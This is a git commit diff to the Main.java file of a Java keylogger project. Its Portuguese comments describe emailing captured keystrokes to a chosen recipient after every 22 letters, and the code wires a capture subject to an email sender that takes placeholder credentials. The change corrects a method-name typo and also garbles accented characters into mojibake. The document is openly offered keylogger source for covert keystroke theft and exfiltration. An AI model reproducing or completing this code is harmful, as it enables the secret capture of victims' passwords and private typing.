ad0edd7bbca1bc2853ed2e528d92f90147127111
remoteEnterprise <reremoteenterprise@gmail.com>
2016-10-08 20:50:21 -0300

    Update Main.java

--- src/br/com/keylogger/Main.java
+++ src/br/com/keylogger/Main.java
@@ -20,18 +20,18 @@ public class Main {
 		
 		/**
 		 * Iniciar a "revista"(subject) e o "leitor"(envio)
-		 * para o envio ter sucesso, é necessario a ativação
+		 * para o envio ter sucesso, Ã© necessario a ativaÃ§Ã£o
 		 * do acesso para aplicativos menos seguros atraves do link abaixo
 		 * http://www.google.com.br/settings/security/lesssecureapps
 		 * 
 		 * O apliativo esta programado para enviar uma mensagem a cada 22 letras digitadas.
-		 * para mudar so ir na classe capture no método nativeKeyPressed
+		 * para mudar so ir na classe capture no mÃ©todo nativeKeyPressed
 		 * e alterar o valor 22 no if para o que desejar.
 		 */
 		Subject captura = new Captura();
 		Observer envio = new Envio(captura, "seu email aqui", "sua senha aqui", 
 				"email do destinatario aqui");
-		captura.addOberser(envio);
+		captura.addObserver(envio);
 		
 		/**
 		 * Registrar gancho para captura
